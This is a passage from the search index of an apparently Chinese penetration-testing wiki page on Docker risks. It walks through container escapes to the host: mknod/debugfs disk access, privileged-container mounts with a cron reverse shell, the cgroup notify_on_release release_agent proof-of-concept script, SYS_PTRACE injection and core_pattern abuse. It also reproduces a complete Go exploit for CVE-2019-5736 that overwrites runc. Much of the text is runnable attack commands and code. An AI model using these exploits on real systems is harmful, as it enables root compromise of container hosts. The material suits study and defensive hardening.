\u53c8\u56e0\u4e3a/etc/host\u662f\u9ed8\u8ba4\u6302\u8f7d\u8fdb\u5bb9\u5668\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u62ff\u5230\u5bbf\u4e3b\u673a\u8bbe\u5907\u5bf9\u5e94\u7684ID\u53f7 cat /proc/self/mountinfo |grep etc \u7136\u540e\u4f7f\u7528\u5982\u4e0b\u6307\u4ee4\uff0c\u914d\u5408\u521a\u521a\u62ff\u5230\u7684\u5bbf\u4e3b\u673a\u5bf9\u5e94\u7684id\u53f7\uff0c\u5c31\u80fd\u8bfb\u5199\u5bbf\u4e3b\u673a\u6587\u4ef6\u4e86 mknod test b 252 1 //\u521b\u5efa\u57fa\u4e8e\u5bbf\u4e3b\u673a\u7684\u5757\u8bbe\u5907 debugfs -w test //\u5bf9\u521a\u521a\u521b\u5efa\u7684\u5757\u8bbe\u5907\u8fdb\u884c\u8c03\u8bd5\uff0c\u4e5f\u5c31\u662f\u80fd\u8fdb\u5165\u5bbf\u4e3b\u673a\u6587\u4ef6\u7cfb\u7edf\u4e86 \u8fd9\u4e2a\u5229\u7528\u65b9\u5f0f \u5e76\u4e0d\u53ea\u5bf9lxcfs\u6709\u6548\uff0c\u5982\u679c\u6211\u4eec\u80fd\u8bfb\u5199cgroup\u6587\u4ef6\uff0c\u7406\u8bba\u4e0a\u90fd\u80fd\u8fd9\u4e48\u9003\u9038 privileged\u53c2\u6570\u7279\u6743\u5bb9\u5668\u9003\u9038 \u73af\u5883\u642d\u5efa docker run --rm --privileged=true -it kpli0rn/ubuntu:18.04 \u7136\u540e\u6211\u4eec\u5c31\u8fdb\u5165\u4e86\u7279\u6743\u5bb9\u5668\u5185\u90e8\u3002 \u5b83\u6709\u5982\u4e0b\u7279\u6743 \u7981\u7528Seccomp\u548cAppArmor\u7b49\u5b89\u5168\u673a\u5236 Capabilities\u52a0\u6ee1 \u90a3\u4e48\u600e\u4e48\u67e5\u770b\u5f53\u524d\u5bb9\u5668\u662f\u5426\u662f\u7279\u6743\u5bb9\u5668\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u5bb9\u5668init\u8fdb\u7a0b\uff08/proc/1\uff09\u7684capabilities\u5c5e\u6027\u4e2d\u662f\u5426\u542f\u7528\u4e86 capability sets \u6765\u5224\u65ad\u3002 capability sets \u9ed8\u8ba4\u662f\u4e0d\u542f\u52a8\u7684\uff0c\u800c\u7279\u6743\u5bb9\u5668\u7684init\u8fdb\u7a0b\u4f1a\u542f\u7528\u3002 \u6211\u4eec\u53ef\u4ee5\u7528\u5982\u4e0b\u6307\u4ee4\u6765\u68c0\u6d4bcapability sets \u662f\u5426\u5728init\u542f\u7528\u4ece\u800c\u5224\u65ad\u662f\u5426\u662f\u9ad8\u6743\u9650\u5bb9\u5668 cat /proc/1/status | grep Cap \u4e0a\u56fe\u4fbf\u662f\u7279\u6743\u5bb9\u5668\u6307\u4ee4\u6267\u884c\u7684\u7ed3\u679c\u3002 \u5229\u7528:\u76ee\u5f55\u6302\u8f7d \u901a\u8fc7fdisk\u6307\u4ee4\u67e5\u770b\u6302\u8f7d\u78c1\u76d8\u7684\u60c5\u51b5 \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u53ef\u4ee5\u5bbf\u4e3b\u673a\u7684\u78c1\u76d8\u5728docker\u5185\u90e8\u663e\u793a\u4e3a\u6587\u4ef6 /dev/vda1. \u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u6302\u8f7d\u5230\u6211\u4eecdocker\u5185\u90e8\u7684\u78c1\u76d8\u4e2d\u53bb \u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u5411\u6302\u8f7d\u8fdb\u6765\u7684\u5bbf\u4e3b\u78c1\u76d8\u4e2d\u5199\u5165\u5b9a\u65f6\u4efb\u52a1\u6765\u53cd\u5f39shell\u4e86 \u5229\u7528:notify_on_release Cgroup \u9700\u8981\u5148\u4e86\u89e3\u4e00\u4e0blinux\u4e0b\u7684cgroup\u673a\u5236 cgroup\u673a\u5236\u662f2.6\u5185\u6838\u7531google\u516c\u53f8\u4e3b\u5bfc\u5f15\u5165\u7684\uff0c\u7528\u4e8e\u5b9e\u73b0linux\u5185\u6838\u8d44\u6e90\u865a\u62df\u5316\u3002docker\u6240\u7528\u5230\u7684\u8d44\u6e90\u9694\u79bb\u6280\u672f\u4fbf\u662fcgroup\u3002 cgroup\u6709\u56db\u4e2a\u6bd4\u8f83\u91cd\u8981\u7684\u6982\u5ff5\uff1a \u5b50\u7cfb\u7edf\uff1a\u4e00\u4e2a\u5b50\u7cfb\u7edf\u5c31\u662f\u4e00\u4e2a\u8d44\u6e90\u7684\u63a7\u5236\u5668\uff0c\u6bd4\u5982CPU\u5b50\u7cfb\u7edf\u5c31\u662f\u63a7\u5236CPU\u7684\u4e00\u4e2a\u63a7\u5236\u5668\u3002 \u5c42\u7ea7\uff1a\u4e00\u4e2a\u5b50\u7cfb\u7edf\u5fc5\u987b\u8981\u9644\u52a0\uff08attach\uff09\u5230\u4e00\u4e2a\u5c42\u7ea7\u4e0a\u624d\u80fd\u8d77\u4f5c\u7528\u3002\u4f7f\u7528 mkdir -p /cgroup/name && mount -t cgroup -o subsystems name /cgroup/name \u547d\u4ee4\u521b\u5efa\u4e00\u4e2a\u5c42\u7ea7\uff0c\u5e76\u628a\u8be5\u5c42\u7ea7\u6302\u8f7d\u5230\u76ee\u5f55\u3002 \u63a7\u5236\u7ec4\u7fa4\uff1a\u8fdb\u7a0b\u53ef\u4ee5\u52a0\u5165\u5230\u67d0\u4e2a\u63a7\u5236\u7ec4\u7fa4\uff0c\u4e5f\u53ef\u4ee5\u8fc1\u79fb\u5230\u53e6\u4e00\u4e2a\u63a7\u5236\u7ec4\u7fa4\u3002\u63a7\u5236\u7ec4\u6307\u660e\u4e86\u5185\u90e8\u8d44\u6e90\u7684\u914d\u989d\u9650\u5236\uff0c\u5373\u4e0a\u9650\u3002 \u4efb\u52a1\uff1a\u4e00\u4e2a\u4efb\u52a1\u5bf9\u5e94\u7740\u7cfb\u7edf\u7684\u4e00\u4e2a\u8fdb\u7a0b\u3002\u63a7\u5236\u7ec4\u7fa4\u6240\u5bf9\u5e94\u7684\u76ee\u5f55\u4e2d\u6709\u4e00\u4e2a tasks \u6587\u4ef6\uff0c\u5c06\u8fdb\u7a0bID\u5199\u8fdb\u8be5\u6587\u4ef6\uff0c\u8be5\u8fdb\u7a0b\u5c31\u4f1a\u53d7\u5230\u8be5\u63a7\u5236\u7ec4\u7fa4\u7684\u9650\u5236\u3002 Cgroup\u6709\u51e0\u4e2a\u91cd\u8981\u7684\u6587\u4ef6 /sys/fs/cgroup \u6709\u6240\u6709\u5b50\u7cfb\u7edf\u7684\u4fe1\u606f /sys/fs/cgroup/<subsystem_name>/cgroup.procs \u8bb0\u5f55\u8be5\u5b50\u7cfb\u7edf\u4efb\u52a1\u8fdb\u7a0bPID /sys/fs/cgroup/<subsystem_name>/tasks \u7ea6\u7b49\u4e8ecgroup.procs /sys/fs/cgroup/<subsystem_name>/notify_on_release \u53ea\u67090\u62161\u4e24\u4e2a\u503c \u5f53\u4e3a1\u65f6\uff0ccgroup\u4e0b\u6240\u6709\u4efb\u52a1\u7ed3\u675f\u540e\uff0c\u5185\u6838\u5c31\u4f1a\u4ee5root\u6743\u9650\u8fd0\u884c/sys/fs/cgroup/<subsystem_name>/release_agent \u6587\u4ef6\u4e2d\u5bf9\u5e94\u8def\u5f84\u7684\u6587\u4ef6 notify_on_release\u673a\u5236\u9003\u9038 \u901a\u8fc7\u4e0a\u9762\u5bf9Cgroup\u7684\u53d9\u8ff0\uff0c\u53ef\u4ee5\u53d1\u73b0notify_on_release \u8fd9\u4e2a\u6587\u4ef6\u5f88\u7279\u6b8a\uff0c\u5f53\u5b83\u4e3a1\u65f6\uff0c\u5728cgroup\u7ed3\u675f\u6240\u6709\u4efb\u52a1\u540e\u5185\u6838\u4f1a\u4ee5root\u6743\u9650\u8fd0\u884c release_agent\u6587\u4ef6\u4e2d \u7684\u5bf9\u5e94\u8def\u5f84\u7684\u6587\u4ef6\u3002 \u6240\u4ee5\u5982\u679c\u6211\u4eec\u5bf9cgroup\u53ef\u7f16\u8f91\uff0c\u4e14\u83b7\u5f97\u4e86\u5f53\u524d\u5bb9\u5668\u5728\u5bbf\u4e3b\u673a\u4e2d\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u4e14\u62e5\u6709cap_sys_admin\u6743\u9650\u90a3\u4e48\u5c31\u53ef\u4ee5\u5b8c\u6210\u9003\u9038\u3002 \u5177\u4f53\u505a\u6cd5\u4e3a\uff0c\u65b0\u5efa\u4e00\u4e2a\u5b50cgroup\uff0c\u5c06\u5176notify_on_release \u8bbe\u4e3a1\uff0c release_agent \u6587\u4ef6\u4e2d\u7684\u8def\u5f84\u8bbe\u4e3a\u5bb9\u5668\u4e2d\u7684\u6076\u610f\u811a\u672c\u6587\u4ef6\u5728\u5bbf\u4e3b\u673a\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u7136\u540e\u6e05\u7a7acgroup.procs\u6216tasks \u6587\u4ef6\uff0c\u4f7f\u6076\u610f\u811a\u672c\u6587\u4ef6\u88ab\u5bbf\u4e3b\u673a\u4ee5root\u6743\u9650\u8fd0\u884c\u3002 \u73af\u5883\u642d\u5efa\uff1a --security-opt apparmor=unconfined \u662f\u5173\u95ed\u5185\u6838\u5b89\u5168\u6a21\u5757\u53c2\u6570\uff0c\u8fd9\u4e2a\u6a21\u5757\u5982\u679c\u6253\u5f00\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4\u9003\u9038\u5931\u8d25 docker run -it --cap-add='SYS_ADMIN' --security-opt apparmor=unconfined kpli0rn/ubuntu:18.04 bash \u68c0\u6d4b\uff1a cat /proc/1/status | grep Cap \u521b\u5efa\u5b50cgroup\u5e76\u4fee\u6539notify_on_release mkdir /tmp/aa && mount -t cgroup -o rdma cgroup /tmp/aa &&echo 1 > /tmp/aa/notify_on_release \u83b7\u53d6\u5728\u5bbf\u4e3b\u673a\u7684\u7edd\u5bf9\u8def\u5f84 sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab \u7136\u540e\u5199\u5165\u5b50cgroup\u7684release_agent\u6587\u4ef6\uff0c\u6307\u5411\u4e00\u4e2a\u6076\u610f\u7684\u811a\u672c\u6587\u4ef6\uff0c\u5e76\u7ed9\u4e88\u53ef\u6267\u884c\u6743 echo '#!/bin/sh' > /tmp/exp echo \"mkdir /hack_in\" > /tmp/exp d=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo $d/tmp/exp > /tmp/aa/release_agent chmod 777 /tmp/exp \u7136\u540e\u6e05\u7a7a\u5b50cgroup\u76ee\u5f55\u4e0b\u7684cgroup.procs\u6216tasks\u6587\u4ef6 sh -c \"echo \\$\\$ > /tmp/aa/cgroup.procs\" \u68c0\u6d4bPOC #!/bin/bash set -uex mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x echo 1 > /tmp/cgrp/x/notify_on_release host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo \"$host_path/cmd\" > /tmp/cgrp/release_agent echo '#!/bin/sh' > /cmd echo \"ps aux > $host_path/output\" >> /cmd chmod a+x /cmd sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\" sleep 2 cat \"/output\" \u5229\u7528\uff1a\u91cd\u5199devices.allow \u4e5f\u5c31\u662f\u521a\u521a\u63d0\u5230\u4e86lxcfs\u91cc\u7528\u5230\u7684\u65b9\u6cd5\u3002\u53ea\u4e0d\u8fc7\u6211\u4eec\u9700\u8981\u624b\u52a8\u628acgroup/devices\u6302\u8f7d\u8fdb\u6765 mkdir /tmp/dev mount -t cgroup -o devices devices /tmp/dev/ \u7136\u540e\u4fbf\u662f\u4fee\u6539devices.allow \u7136\u540e\u4fbf\u662f\u627e\u5bbf\u4e3b\u673anode\u53f7\uff0c\u5e76debugfs\u8c03\u8bd5 SYS_PTRACE \u6743\u9650\u9003\u9038 SYS_PTRACE\u662f\u542f\u52a8docker\u5bb9\u5668\u65f6\u9644\u52a0\u7684\u4e00\u4e2a\u6743\u9650\u53c2\u6570\uff0c\u5b83\u8d77\u5230\u4e00\u4e2a\u8c03\u8bd5\u5668\u7684\u4f5c\u7528\u3002\u4ee5\u9ad8\u6743\u9650\u53c2\u6570\u542f\u52a8\u65f6\u9ed8\u8ba4\u5e26\u6709\u8be5\u6743\u9650\u3002 docker --cap-add=SYS_PTRACE \u6216 Kubernetes PODS \u8bbe\u7f6e securityContext.capabilities \u4e3a SYS_PTRACE \u914d\u7f6e\u7b49\u628a SYS_PTRACE capabilities\u6743\u9650\u8d4b\u4e88\u5bb9\u5668\u7684\u60c5\u51b5\uff0c\u90fd\u53ef\u80fd\u5bfc\u81f4\u5bb9\u5668\u9003\u9038\u3002 ........... \u8fd9\u4e2a\u573a\u666f\u5f88\u5e38\u89c1\uff0c\u56e0\u4e3a\u65e0\u8bba\u662f\u4e0d\u662f\u7ebf\u4e0a\u73af\u5883\uff0c\u4e1a\u52a1\u8fdb\u884c\u707e\u96be\u91cd\u8bd5\u548c\u7a0b\u5e8f\u8c03\u8bd5\u90fd\u662f\u6ca1\u529e\u6cd5\u907f\u514d\u7684\uff0c\u6240\u4ee5\u5bb9\u5668\u7ecf\u5e38\u88ab\u8bbe\u7f6e ptrace \u6743\u9650\u3002 \u2014\u2014\u2014\u2014\u817e\u8baf\u84dd\u519b \u56e0\u4e3a\u6709\u8c03\u8bd5\u5668\u6743\u9650\uff0c\u90a3\u4e48\u5c31\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u5bf9\u5176\u4ed6\u8fdb\u7a0b\u8fdb\u884c\u8c03\u8bd5\uff0c\u540c\u65f6\u4e5f\u5c31\u610f\u5473\u7740\u53ef\u4ee5\u5bf9\u5176\u4ed6\u8fdb\u7a0b\u8fdb\u884c\u8fdb\u7a0b\u6ce8\u5165\u3002 \u4f46\u662f\u7531\u4e8enamespace\u7684\u5b58\u5728\u9020\u6210\u4e86\u8fdb\u7a0b\u9694\u79bb\uff0c\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u5230\u5bbf\u4e3b\u673a\u8fdb\u7a0bpid\uff0c\u56e0\u6b64\u5728\u5bb9\u5668\u542f\u52a8\u65f6\u9700\u8981\u9644\u52a0--pid=host\u6253\u7834\u8fdb\u7a0b\u9694\u79bb \u540c\u65f6apparmor\u4e5f\u53ef\u80fd\u4f1a\u5bf9\u6b64\u9020\u6210\u4e00\u5b9a\u5f71\u54cd\uff0c\u5b9e\u9a8c\u65f6\u53ef\u4ee5\u5c06\u5176\u5173\u95ed \u73af\u5883\u642d\u5efa docker run --pid=host --cap-add=SYS_PTRACE --rm -it kpli0rn/ubuntu:18.04 \u68c0\u6d4b \u7136\u540e\u7528ps\u6307\u4ee4\u627e\u5230\u5bbf\u4e3b\u673a\u8fdb\u7a0bPID ps auxx | grep root \u7136\u540e\u4f7f\u7528exp\u8fdb\u884c\u8fdb\u7a0b\u6ce8\u5165\uff1a https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c \u9700\u8981\u81ea\u5df1\u7f16\u8bd1\u5e76\u4e14\u4fee\u6539\u6b64\u5904\u7684payload\u3002\u6539\u6210msf\u6216\u8005cs\u7684\u90fd\u884c cap_sys_module \u6743\u9650\u9003\u9038 \u8fd9\u4e2a\u7279\u6743\u8868\u793a\u80fd\u591f\u52a0\u8f7d\u5185\u6838\u6a21\u5757\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u6267\u884c\u6076\u610f\u547d\u4ee4\u7684\u5185\u6838\u6a21\u5757\u7ed9\u5bb9\u5668\u52a0\u8f7d\u5c31\u884c\u4e86\u3002\u539f\u7406\u5c31\u662f\u8fd9\u6837\u3002 \u73af\u5883\u642d\u5efa docker run --cap-add=SYS_MODULE --rm -it kpli0rn/ubuntu:18.04 \u5177\u4f53\u590d\u73b0\uff1a https://blog.jus4fun.xyz/article/109/ docker runc \u9003\u9038 CVE-2019-5736 ref: https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/ \u63a8\u8350\u9605\u8bfb docker version <=18.09.2 RunC version <=1.0-rc6 \u73af\u5883\u642d\u5efa,ubuntu\u4e0b\u7528metarget\uff0c\u5b98\u65b9\u63a8\u8350\u7248\u672c\u4e3aUbuntu 16.04 or 18.04 metarget cnv install cve-2019-5736 \u6216\u8005\u811a\u672c curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh && bash install.sh \u539f\u7406 runc\u662fDocker\u7684\u5bb9\u5668\u8fd0\u884c\u65f6\uff0c\u8d1f\u8d23Dokcer\u5bb9\u5668\u7684\u5bb9\u5668\u751f\u6210\u548c\u8fd0\u884c\uff0c\u4e3e\u4e2a\u4f8b\u5b50 docker run -it ubuntu bash \u5bb9\u5668\u7684bash\u4ea4\u4e92\u754c\u9762\u5c31\u662f\u7531runc\u542f\u52a8\u7684\u3002runc\u4e00\u822c\u5728\u5bbf\u4e3b\u673a\u4e0a\u4ee5root\u6743\u9650\u8dd1\u7740\u3002 \u540c\u65f6\u5728linux\u4e2d\u5b58\u5728/proc/pid/exe \u8fd9\u4e2a\u4e1c\u897f\uff0c\u6307\u5411\u67d0\u8fdb\u7a0b\u7684\u6e90\u7a0b\u5e8f\uff0c\u5982\u679c\u662f/proc/self/exe \u5c31\u662f\u6307\u5411\u5f53\u524d\u8fdb\u7a0b\u7684\u6e90\u7a0b\u5e8f\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301\uff0c\u5c06\u5bb9\u5668\u7684bash\u5185\u5bb9\u66f4\u6539\u4e3a#!/proc/self/exe\uff0c\u5373\u6307\u5411\u5f53\u524d\u8fdb\u7a0b\u6e90\u7a0b\u5e8f\uff0c\u8fd9\u6837\u4e0b\u6b21\u6267\u884c\u5bb9\u5668docker run -it ubuntu bash\u65f6\u5c31\u4f1a\u6267\u884crunc\u672c\u8eab\u3002 runc\u5728\u5bb9\u5668\u4e2d\u662f\u53ef\u4ee5\u88ab\u627e\u5230\u7684\uff0c\u5982\u679c\u6211\u4eec\u4fee\u6539\u4e86runc\u6587\u4ef6\u672c\u8eab\u7684\u5185\u5bb9\uff0c\u5982\u4fee\u6539\u4e3a\u53cd\u5f39shell\uff0c\u90a3\u4e48\u4e0b\u6b21\u6267\u884cdocker run -it ubuntu bash\u65f6\u5c31\u4f1a\u81ea\u52a8\u53cd\u5f39\u4e00\u4e2ashell\u56de\u6765\u3002 \u5229\u7528 exp\uff1a https://github.com/Frichetten/CVE-2019-5736-PoC \u6ce8\u91ca\u5f15\u7528\u81ea https://ble55ing.github.io/2020/03/19/docker-20195736/ package main // Implementation of CVE-2019-5736 // Created with help from @singe, @_cablethief, and @feexd. // This commit also helped a ton to understand the vuln // https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d import ( \"fmt\" \"io/ioutil\" \"os\" \"strconv\" \"strings\" ) // This is the line of shell commands that will execute on the host var payload = \"#!/bin/bash \\n mkdir /hack_in &\\n\" func main() { //\u9996\u5148\u6765\u770b\u770b\u80fd\u4e0d\u80fd\u6253\u5f00/bin/sh\uff0c\u5373\u6709root\u6743\u9650\u5c31\u6210 fd, err := os.Create(\"/bin/sh\") if err != nil { fmt.Println(err) return } //\u7136\u540e\u5c06\u5176\u8986\u76d6\u4e3a#!/proc/self/exe fmt.Fprintln(fd, \"#!/proc/self/exe\") err = fd.Close() if err != nil { fmt.Println(err) return } fmt.Println(\"[+] Overwritten /bin/sh successfully\") // \u5faa\u73af\u904d\u5386/proc\u91cc\u7684\u6587\u4ef6\uff0c\u76f4\u5230\u627e\u5230runc\u662f\u54ea\u4e2a\u8fdb\u7a0b var found int for found == 0 { pids, err := ioutil.ReadDir(\"/proc\") if err != nil { fmt.Println(err) return } for _, f := range pids { fbytes, _ := ioutil.ReadFile(\"/proc/\" + f.Name() + \"/cmdline\") fstring := string(fbytes) if strings.Contains(fstring, \"runc\") { fmt.Println(\"[+] Found the PID:\", f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil { fmt.Println(err) return } } } } // \u5faa\u73af\u53bb\u8bfb\u8fd9\u4e2a/proc/pid/exe\uff0c\u5148\u62ff\u5230\u4e00\u4e2a\u8be5\u6587\u4ef6\u7684fd\uff0c\u8be5fd\u5c31\u6307\u5411\u4e86runc\u7a0b\u5e8f\u7684\u4f4d\u7f6e var handleFd = -1 for handleFd == -1 { // Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ := os.OpenFile(\"/proc/\"+strconv.Itoa(found)+\"/exe\", os.O_RDONLY, 0777) if int(handle.Fd()) > 0 { handleFd = int(handle.Fd()) } } fmt.Println(\"[+] Successfully got the file handle\") // \u7136\u540e\u4e0d\u65ad\u7684\u53bb\u5c1d\u8bd5\u5199\u8fd9\u4e2a\u6307\u5411\u7684\u6587\u4ef6\uff0c\u4e00\u5f00\u59cb\u7531\u4e8erunc\u4f1a\u5148\u5360\u7528\u7740\uff0c\u5199\u4e0d\u8fdb\u53bb\uff0c\u76f4\u5230runc\u7684\u5360\u7528\u89e3\u9664\u4e86\uff0c\u5c31\u7acb\u5373 for { writeHandle, _ := os.OpenFile(\"/proc/self/fd/\"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) > 0 { fmt.Println(\"[+] Successfully got write handle\", writeHandle) writeHandle.Write([]byte(payload)) return } } } \u7528go\u6253\u5305 go build a.go \u6a21\u62df\u9ed1\u5ba2\u628a\u4e8c\u8fdb\u5236\u6587\u4ef6\u4f20\u4e0a\u53bb\uff0c\u5e76\u7ed9\u4e88\u53ef\u6267\u884c\u6743 docker cp ./a 1f615cc4c464:/tmp chmod 777 /tmp/a \u6267\u884cexp \u7136\u540e\u5207\u4e2a\u7a97\u53e3\uff0c\u518d\u6267\u884c\u4e00\u4e0bdocker exec -it 1f615cc4c464 /bin/sh \u53ef\u4ee5\u53d1\u73b0\u6076\u610f\u6307\u4ee4\uff08\u5411\u6839\u76ee\u5f55\u5199\u5165hack_in\u6587\u4ef6\u5939\uff09\u88ab\u6210\u529f\u6267\u884c \uff08\u8fd9\u91cc\u6211\u6362\u4e86\u4e2a\u73af\u5883\uff09 \u9003\u9038\u603b\u7ed3 \u5f15\u7528\u81ea\u817e\u8baf\u84dd\u519b\uff1a \u4ee5\u76ee\u6807\u201c\u83b7\u53d6\u5bbf\u4e3b\u673a\u4e0a\u7684\u914d\u7f6e\u6587\u4ef6\u201d\u4e3a\u4f8b\uff0c\u4ee5\u4e0b\u51e0\u79cd\u9003\u9038\u624b\u6cd5\u5728\u5bb9\u6613\u5728\u9632\u5fa1\u56e2\u961f\u4e2d\u66b4\u9732\u7684\u6982\u7387\u4ece\u5927\u5230\u5c0f\uff0c\u6392\u5e8f\u5982\u4e0b(\u90e8\u5206\u5178\u578b\u624b\u6cd5\u4e3e\u4f8b\uff0c\u4e0d\u540c\u7684EDR\u60c5\u51b5\u4e0d\u540c)\uff1a mount /etc + write crontab mount /root/.ssh + write authorized_keys old CVE/vulnerability exploit write cgroup notify_on_release write procfs core_pattern volumeMounts: / + chroot remount and rewrite cgroup create ptrace cap container websocket/sock shell + volumeMounts: /path","title":"Docker\u9762\u4e34\u7684\u98ce\u9669"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#docker","text":"","title":"Docker\u9762\u4e34\u7684\u98ce\u9669"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#_1","text":"\u6211\u662f\u5426\u5728Docker\u4e2d\uff1f \u9003\u9038 \u6302\u8f7d\u5bbf\u4e3b\u673aprocfs\u9003\u9038 \u5229\u7528 \u5229\u7528docker.sock\u9020\u6210\u9003\u9038 \u5229\u7528 \u8fdc\u7a0bAPI\u672a\u6388\u6743\u9020\u6210\u9003\u9038 \u5229\u7528 \u5185\u6838\u6f0f\u6d1e \u5229\u7528lxcfs \u5229\u7528 privileged\u53c2\u6570\u7279\u6743\u5bb9\u5668\u9003\u9038 \u5229\u7528:\u76ee\u5f55\u6302\u8f7d \u5229\u7528:notify_on_release \u5229\u7528\uff1a\u91cd\u5199devices.allow SYS_PTRACE \u6743\u9650\u9003\u9038 cap_sys_module \u6743\u9650\u9003\u9038 docker runc \u9003\u9038 CVE-2019-5736 \u539f\u7406 \u5229\u7528 \u9003\u9038\u603b\u7ed3","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#docker_1","text":"\u68c0\u67e5/.dockerenv\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff1b \u68c0\u67e5/proc/1/cgroup\u5185\u662f\u5426\u5305\u542b\"docker\"\u7b49\u5b57\u7b26\u4e32\uff1b \u68c0\u67e5\u662f\u5426\u5b58\u5728container\u73af\u5883\u53d8\u91cf\u3002","title":"\u6211\u662f\u5426\u5728Docker\u4e2d\uff1f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#_2","text":"\u4eceDocker\u9003\u9038\u5230\u5bbf\u4e3b\u673a","title":"\u9003\u9038"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/#procfs","text":"procfs\u7cfb\u7edf\u8bf4\u767d\u4e86\u5c31\u662f/proc\u76ee\u5f55\uff0c\u5b83\u662f\u4e00\u4e2a\u4f2a\u6587\u4ef6\u7cfb\u7edf\uff0c\u7528\u4e8e\u53cd\u6620\u5404\u4e2a\u8fdb\u7a0b\u7684\u72b6\u6001\u7b49\u4fe1\u606f\u3002 \u5f53\u4e3b\u673a\u5d29\u6e83\u65f6\uff0c/proc/sys/kernel/core_pattern \u4f1a\u5c06\u5d29\u6e83\u65f6\u5185\u5b58\u8f6c\u50a8\u6570\u636e\u8fdb\u884c\u5bfc\u51fa\u3002 \u81ea2.6.19\u5185\u6838\u7248\u672c\u5f00\u59cb\uff0c\u652f\u6301\u4e86\u65b0\u8bed\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u5f80/proc/sys/kernel/core_pattern\u6587\u4ef6\u672b\u5c3e\u6dfb\u52a0\u7ba1\u9053\u7b26|\u7136\u540e\u5199\u5165\u547d\u4ee4\uff0c\u5f53\u4e3b\u673a\u5d29\u6e83\u65f6\u4fbf\u4f1a\u6267\u884c\u7ba1\u9053\u7b26\u540e\u9762\u7684\u547d\u4ee4\u3002 \u5982\u679c\u5bbf\u4e3b\u673a\u7684procfs\u7cfb\u7edf\u6302\u8f7d\u5230\u4e86docker\u91cc\u9762\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5bf9\u5bbf\u4e3b\u673a\u7684/proc/sys/kernel/core_pattern\u4efb\u610f\u5199\u5165\uff0c\u5199\u5165\u6076\u610f\u547d\u4ee4\u540e\u518d\u60f3\u529e\u6cd5\u5f15\u8d77\u62a5\u9519\u5d29\u6e83\uff0c\u8fd9\u6837\u5bbf\u4e3b\u673a\u4fbf\u4f1a\u6267\u884c\u6211\u4eec\u5199\u5165\u5230core_pattern\u91cc\u9762\u7684\u547d\u4ee4\u4e86\u3002 \u73af\u5883\u642d\u5efa\uff1a\u628a\u5bbf\u4e3b\u673a/proc\u6302\u8f7d\u5230docker /host/proc docker run -it --rm --mount type=bind,source=/proc,target=/host/proc kpli0rn/ubuntu:18.04 bash \u600e\u4e48\u68c0\u6d4b\uff1f\u904d\u5386\u6240\u6709\u6587\u4ef6\uff0c\u5982\u679c\u6709\u4e24\u4e2a\u53ca\u4ee5\u4e0acore_pattern\u6587\u4ef6\u51fa\u73b0\u5c31\u5f88\u53ef\u7591\u4e86\u3002 find / -name 